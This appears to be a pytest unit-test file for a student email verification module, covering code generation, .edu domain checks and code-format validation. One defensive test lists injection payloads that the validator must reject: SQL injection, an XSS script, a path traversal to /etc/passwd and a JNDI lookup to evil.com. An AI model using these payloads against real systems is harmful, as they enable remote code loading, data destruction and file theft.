"""
Unit tests for verification_logic module.

Tests pure verification logic functions with no external dependencies.
Target: 100% code coverage.
"""
import pytest
import sys
from pathlib import Path

# Add lambda directory to path
lambda_dir = Path(__file__).parent.parent.parent / 'lambda'
sys.path.insert(0, str(lambda_dir))

from verification_logic import (
    generate_code,
    validate_edu_email,
    is_valid_code_format,
    CODE_LENGTH,
    MAX_VERIFICATION_ATTEMPTS
)


# ==============================================================================
# Constants Tests
# ==============================================================================

def test_constants():
    """Test that module constants have expected values."""
    assert CODE_LENGTH == 6
    assert MAX_VERIFICATION_ATTEMPTS == 3


# ==============================================================================
# generate_code() Tests
# ==============================================================================

@pytest.mark.unit
class TestGenerateCode:
    """Tests for generate_code() function."""

    def test_default_length(self):
        """Test that default code length is 6 digits."""
        code = generate_code()
        assert len(code) == 6

    def test_custom_length(self):
        """Test code generation with custom length."""
        for length in [4, 8, 10]:
            code = generate_code(length=length)
            assert len(code) == length

    def test_all_digits(self):
        """Test that generated code contains only digits."""
        code = generate_code()
        assert code.isdigit()

    def test_randomness(self):
        """Test that multiple calls produce different codes (probabilistically)."""
        codes = [generate_code() for _ in range(10)]
        # With 10^6 possible 6-digit codes, getting 10 unique codes is highly likely
        assert len(set(codes)) > 1, "Generated codes should vary"

    def test_zero_length(self):
        """Test code generation with zero length."""
        code = generate_code(length=0)
        assert code == ""

    def test_single_digit(self):
        """Test code generation with length 1."""
        code = generate_code(length=1)
        assert len(code) == 1
        assert code.isdigit()

    def test_large_length(self):
        """Test code generation with large length."""
        code = generate_code(length=100)
        assert len(code) == 100
        assert code.isdigit()


# ==============================================================================
# validate_edu_email() Tests
# ==============================================================================

@pytest.mark.unit
class TestValidateEduEmail:
    """Tests for validate_edu_email() function."""

    # Valid email tests
    def test_valid_auburn_email(self):
        """Test validation of valid Auburn email."""
        assert validate_edu_email("student@auburn.edu") is True

    def test_valid_sans_email(self):
        """Test validation of valid SANS student email."""
        assert validate_edu_email("student@student.sans.edu") is True

    def test_valid_email_with_dots(self):
        """Test email with dots in local part."""
        assert validate_edu_email("first.last@auburn.edu") is True

    def test_valid_email_with_numbers(self):
        """Test email with numbers in local part."""
        assert validate_edu_email("student123@auburn.edu") is True

    def test_valid_email_with_plus(self):
        """Test email with plus sign (common for aliases)."""
        assert validate_edu_email("student+test@auburn.edu") is True

    def test_valid_email_with_hyphen(self):
        """Test email with hyphen in local part."""
        assert validate_edu_email("student-name@auburn.edu") is True

    # Case insensitivity tests
    def test_case_insensitive_domain(self):
        """Test that domain matching is case-insensitive."""
        assert validate_edu_email("student@AUBURN.EDU") is True
        assert validate_edu_email("student@Auburn.Edu") is True
        assert validate_edu_email("student@aUbUrN.eDu") is True

    def test_case_insensitive_local_part(self):
        """Test that local part can be uppercase (email allows it)."""
        assert validate_edu_email("STUDENT@auburn.edu") is True
        assert validate_edu_email("Student@auburn.edu") is True

    # Invalid format tests
    def test_invalid_no_at_sign(self):
        """Test email without @ sign."""
        assert validate_edu_email("studentauburn.edu") is False

    def test_invalid_no_domain(self):
        """Test email without domain part."""
        assert validate_edu_email("student@") is False

    def test_invalid_no_local_part(self):
        """Test email without local part."""
        assert validate_edu_email("@auburn.edu") is False

    def test_invalid_no_tld(self):
        """Test email without top-level domain."""
        assert validate_edu_email("student@auburn") is False

    def test_invalid_multiple_at_signs(self):
        """Test email with multiple @ signs."""
        assert validate_edu_email("student@@auburn.edu") is False

    def test_invalid_spaces(self):
        """Test email with spaces."""
        assert validate_edu_email("student name@auburn.edu") is False
        assert validate_edu_email("student@auburn .edu") is False

    def test_invalid_special_chars(self):
        """Test email with invalid special characters."""
        assert validate_edu_email("student!@auburn.edu") is False
        assert validate_edu_email("student#@auburn.edu") is False

    # Wrong domain tests
    def test_invalid_wrong_domain(self):
        """Test valid email format but wrong domain."""
        assert validate_edu_email("student@gmail.com") is False
        assert validate_edu_email("student@yahoo.com") is False
        assert validate_edu_email("student@outlook.com") is False

    def test_invalid_edu_but_not_allowed(self):
        """Test .edu email that's not in allowed list."""
        assert validate_edu_email("student@mit.edu") is False
        assert validate_edu_email("student@stanford.edu") is False

    def test_invalid_subdomain_mismatch(self):
        """Test email with wrong subdomain."""
        assert validate_edu_email("student@wrong.auburn.edu") is False
        assert validate_edu_email("student@sans.edu") is False  # Should be student.sans.edu

    # Edge cases
    def test_empty_string(self):
        """Test empty string input."""
        assert validate_edu_email("") is False

    def test_whitespace_only(self):
        """Test whitespace-only input."""
        assert validate_edu_email("   ") is False

    def test_none_type(self):
        """Test None input raises appropriate error."""
        with pytest.raises(TypeError):
            validate_edu_email(None)

    # Custom allowed_domains tests
    def test_custom_single_domain(self):
        """Test with custom single domain."""
        assert validate_edu_email("student@example.com", allowed_domains=["example.com"]) is True
        assert validate_edu_email("student@other.com", allowed_domains=["example.com"]) is False

    def test_custom_multiple_domains(self):
        """Test with custom multiple domains."""
        allowed = ["example.com", "test.org", "demo.edu"]
        assert validate_edu_email("student@example.com", allowed_domains=allowed) is True
        assert validate_edu_email("student@test.org", allowed_domains=allowed) is True
        assert validate_edu_email("student@demo.edu", allowed_domains=allowed) is True
        assert validate_edu_email("student@other.com", allowed_domains=allowed) is False

    def test_custom_empty_domains_list(self):
        """Test with empty allowed_domains list."""
        assert validate_edu_email("student@auburn.edu", allowed_domains=[]) is False
        assert validate_edu_email("student@any.com", allowed_domains=[]) is False

    def test_default_domains_when_none(self):
        """Test that default domains are used when allowed_domains is None."""
        # Should use default: ['auburn.edu', 'student.sans.edu']
        assert validate_edu_email("student@auburn.edu", allowed_domains=None) is True
        assert validate_edu_email("student@student.sans.edu", allowed_domains=None) is True
        assert validate_edu_email("student@other.edu", allowed_domains=None) is False

    def test_domain_case_insensitive_in_custom_list(self):
        """Test case insensitivity with custom domains."""
        # Note: allowed_domains list items should be lowercase for proper matching
        allowed = ["example.com"]  # Domains in list should be lowercase
        assert validate_edu_email("student@example.com", allowed_domains=allowed) is True
        assert validate_edu_email("student@EXAMPLE.COM", allowed_domains=allowed) is True
        assert validate_edu_email("student@Example.Com", allowed_domains=allowed) is True

    # Real-world scenarios
    def test_realistic_auburn_emails(self):
        """Test realistic Auburn email patterns."""
        auburn_emails = [
            "abc0123@auburn.edu",
            "john.doe@auburn.edu",
            "jane_doe@auburn.edu",
            "professor123@auburn.edu",
        ]
        for email in auburn_emails:
            assert validate_edu_email(email) is True, f"Should accept {email}"

    def test_realistic_sans_emails(self):
        """Test realistic SANS student email patterns."""
        sans_emails = [
            "student@student.sans.edu",
            "john.doe@student.sans.edu",
            "sec504@student.sans.edu",
        ]
        for email in sans_emails:
            assert validate_edu_email(email) is True, f"Should accept {email}"


# ==============================================================================
# is_valid_code_format() Tests
# ==============================================================================

@pytest.mark.unit
class TestIsValidCodeFormat:
    """Tests for is_valid_code_format() function."""

    # Valid codes
    def test_valid_six_digit_code(self):
        """Test valid 6-digit code."""
        assert is_valid_code_format("123456") is True

    def test_valid_all_zeros(self):
        """Test code with all zeros."""
        assert is_valid_code_format("000000") is True

    def test_valid_all_nines(self):
        """Test code with all nines."""
        assert is_valid_code_format("999999") is True

    def test_valid_mixed_digits(self):
        """Test various valid 6-digit combinations."""
        valid_codes = ["123456", "654321", "111111", "999999", "102030", "010101"]
        for code in valid_codes:
            assert is_valid_code_format(code) is True, f"Should accept {code}"

    # Invalid length
    def test_invalid_too_short(self):
        """Test codes that are too short."""
        assert is_valid_code_format("12345") is False  # 5 digits
        assert is_valid_code_format("1234") is False   # 4 digits
        assert is_valid_code_format("1") is False      # 1 digit

    def test_invalid_too_long(self):
        """Test codes that are too long."""
        assert is_valid_code_format("1234567") is False  # 7 digits
        assert is_valid_code_format("12345678") is False # 8 digits

    def test_invalid_empty_string(self):
        """Test empty string."""
        assert is_valid_code_format("") is False

    # Invalid characters
    def test_invalid_contains_letters(self):
        """Test codes containing letters."""
        assert is_valid_code_format("12345a") is False
        assert is_valid_code_format("a23456") is False
        assert is_valid_code_format("123a56") is False
        assert is_valid_code_format("ABCDEF") is False

    def test_invalid_contains_special_chars(self):
        """Test codes containing special characters."""
        assert is_valid_code_format("12345!") is False
        assert is_valid_code_format("123-456") is False
        assert is_valid_code_format("123 456") is False
        assert is_valid_code_format("123.456") is False
        assert is_valid_code_format("12345@") is False

    def test_invalid_whitespace(self):
        """Test codes with whitespace."""
        assert is_valid_code_format(" 123456") is False  # Leading space
        assert is_valid_code_format("123456 ") is False  # Trailing space
        assert is_valid_code_format("12 3456") is False  # Middle space
        assert is_valid_code_format("      ") is False  # Only spaces

    def test_invalid_mixed_alphanumeric(self):
        """Test codes with mixed letters and numbers."""
        assert is_valid_code_format("12ab56") is False
        assert is_valid_code_format("1a2b3c") is False

    # Edge cases
    def test_none_input(self):
        """Test None input raises appropriate error."""
        with pytest.raises(AttributeError):
            is_valid_code_format(None)

    def test_numeric_types(self):
        """Test that numeric types (not strings) fail appropriately."""
        # Python int has isdigit() method but behaves differently
        with pytest.raises(AttributeError):
            is_valid_code_format(123456)

    # Security considerations
    def test_no_code_injection(self):
        """Test that potential injection attempts are rejected."""
        malicious_inputs = [
            "'; DROP TABLE--",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ]
        for malicious in malicious_inputs:
            assert is_valid_code_format(malicious) is False


# ==============================================================================
# Integration-style tests (testing functions together)
# ==============================================================================

@pytest.mark.unit
class TestVerificationWorkflow:
    """Test how verification functions work together in realistic scenarios."""

    def test_generate_and_validate_code_format(self):
        """Test that generated codes always pass format validation."""
        for _ in range(100):
            code = generate_code()
            assert is_valid_code_format(code) is True

    def test_complete_verification_flow_data(self):
        """Test data flow through verification functions."""
        # Generate code
        code = generate_code()
        assert len(code) == CODE_LENGTH

        # Validate email
        email = "student@auburn.edu"
        assert validate_edu_email(email) is True

        # Validate code format
        assert is_valid_code_format(code) is True

    def test_reject_invalid_email_domain_combinations(self):
        """Test that domain validation works correctly with various inputs."""
        # Valid for Auburn, invalid for custom domain
        email = "student@auburn.edu"
        assert validate_edu_email(email, allowed_domains=["auburn.edu"]) is True
        assert validate_edu_email(email, allowed_domains=["other.edu"]) is False

    def test_max_attempts_constant_usage(self):
        """Test that MAX_VERIFICATION_ATTEMPTS is accessible and has expected value."""
        # This would be used in handlers to limit attempts
        assert MAX_VERIFICATION_ATTEMPTS == 3
        assert isinstance(MAX_VERIFICATION_ATTEMPTS, int)
        assert MAX_VERIFICATION_ATTEMPTS > 0
